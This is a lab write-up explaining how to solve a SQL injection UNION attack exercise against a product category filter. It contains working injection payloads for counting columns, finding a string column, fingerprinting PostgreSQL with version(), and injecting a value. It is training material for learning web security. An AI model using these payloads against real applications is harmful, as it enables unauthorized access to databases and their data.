## SQL injection UNION attack, finding a column containing text

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

## Notes

- `/login`
- `/filter?category=parameter`

## Resume

1. Find the number of columns
2. Identify which column accepts string values
3. Inject the provided value
4. Solve the lab

## Solve

First, determine the number of columns returned by the query.

Trying with 3 columns :

```
' UNION ALL SELECT NULL,NULL,NULL-- -
```

works correctly.

Trying with only 2 columns :

```
' UNION ALL SELECT NULL,NULL-- -
```

returns :

```
Internal Server Error
```

This confirms that the query contains **3 columns**.

The next step is to identify which column accepts string values.

Testing the first column :

```
' UNION ALL SELECT 'abc',NULL,NULL-- -
```

returns an error.

Testing the second column :

```
' UNION ALL SELECT NULL,'abc',NULL-- -
```

works correctly and displays the value inside the response.

Testing the third column :

```
' UNION ALL SELECT NULL,NULL,'abc'-- -
```

returns an error.

This confirms that the **second column** is compatible with string data.

To confirm the database type, the following payload can be used :

```
' UNION ALL SELECT NULL,version(),NULL-- -
```

which returns :

```
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
```

Finally, inject the value provided by the lab :

```
' UNION ALL SELECT NULL,'1AX5wz',NULL-- -
```

The value is reflected inside the response and the lab is solved.